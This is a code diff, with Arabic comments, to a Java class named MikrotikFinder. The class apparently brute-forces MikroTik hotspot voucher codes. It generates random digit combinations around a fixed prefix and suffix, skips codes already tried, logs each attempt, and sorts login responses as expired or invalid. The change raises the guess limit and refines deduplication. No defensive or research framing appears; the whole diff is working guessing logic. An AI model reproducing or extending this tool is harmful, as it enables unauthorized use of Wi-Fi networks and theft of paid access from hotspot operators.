@@ -201,14 +201,18 @@ public class MikrotikFinder {
         // 🏷️ تصنيف الحالات
         if (postResp != null) {
             String lower = postResp.toLowerCase();
+            String varPart = voucher;
+            if (suffix != null && !suffix.isEmpty() && voucher.endsWith(suffix)) {
+                varPart = voucher.substring(0, voucher.length() - suffix.length());
+            }
             if (lower.contains("expired") || lower.contains("منتهي") || lower.contains("انتهت") ||
                 lower.contains("expiry") || lower.contains("expire")) {
-                db.addAttemptWithStatus(voucher, "expired", null);
+                db.addAttemptFull(voucher, varPart, "expired", null);
                 return false;
             }
             if (lower.contains("invalid") || lower.contains("denied") ||
                 lower.contains("not found") || lower.contains("غير صحيح")) {
-                db.addAttemptWithStatus(voucher, "error", null);
+                db.addAttemptFull(voucher, varPart, "error", null);
                 return false;
             }
         }
@@ -357,15 +361,17 @@ public class MikrotikFinder {
 
     private String generateVoucher() {
         long max = (long) Math.pow(10, Math.min(varDigits, 12));
-        int maxTries = varDigits >= 4 ? 2000 : 200;
+        int maxTries = varDigits >= 4 ? 3000 : 200;
         for (int i = 0; i < maxTries; i++) {
             long num = (long)(Math.random() * max);
-            String v = prefix + pad(num, varDigits) + middle + suffix;
-            if (triedInSession.contains(v)) continue;
-            // للأرقام 4+، تجنب الأرقام المجربة سابقاً (من نفس البادئة)
-            if (varDigits >= 4 && db.exists(v)) continue;
-            triedInSession.add(v);
-            db.addAttemptWithStatus(v, "pending", null);
+            // varPart = البادئة + المتغيرة (بدون اللاحقة)
+            String varPart = prefix + pad(num, varDigits);
+            String v = varPart + middle + suffix;
+            if (triedInSession.contains(varPart)) continue;
+            // للأرقام 4+، تجاهل الأرقام المتغيرة المجربة سابقاً (بغض النظر عن اللاحقة)
+            if (varDigits >= 4 && db.existsVarPart(varPart)) continue;
+            triedInSession.add(varPart);
+            db.addAttemptFull(v, varPart, "pending", null);
             return v;
         }
         return null;
